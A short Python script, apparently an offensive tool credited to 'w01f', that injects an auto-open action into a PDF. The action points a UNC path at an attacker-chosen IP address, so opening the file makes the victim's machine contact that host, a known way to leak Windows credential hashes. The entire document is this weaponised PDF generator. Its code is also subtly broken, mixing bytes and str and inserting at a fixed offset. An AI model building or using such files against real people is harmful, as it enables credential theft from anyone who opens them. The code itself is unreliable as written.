import argparse

def inject_payload(pdf_data, target_ip):
    pdf_payload = '/AA <</O <</F (\\\\\\\\' + target_ip + '\\\\test)/D [ 0 /Fit]/S /GoToE>>>>'
    payload_insert_point = pdf_data.find('/Parent') + 13    
    modified_data = pdf_data[:payload_insert_point] + pdf_payload + pdf_data[payload_insert_point:]   
    return modified_data

def main():
    parser = argparse.ArgumentParser(description="Injects a payload into a PDF file based on IP address by w01f.")
    parser.add_argument("pdf_path", help="Path to the PDF file to be modified.")
    parser.add_argument("ip_address", help="IP address to use in the payload.")
    args = parser.parse_args()

    print(f"[*] PdfFile: {args.pdf_path}")
    print(f"[*] IP Address: {args.ip_address}")

    with open(args.pdf_path, 'rb') as file:
        pdf_content = file.read()

    updated_pdf_content = inject_payload(pdf_content, args.ip_address)
    output_pdf_path = args.pdf_path + '.payload.pdf'

    print(f"Payload: {output_pdf_path}")
    with open(output_pdf_path, 'wb') as output_file:
        output_file.write(updated_pdf_content)

    print("All Done")

if __name__ == "__main__":
    main()
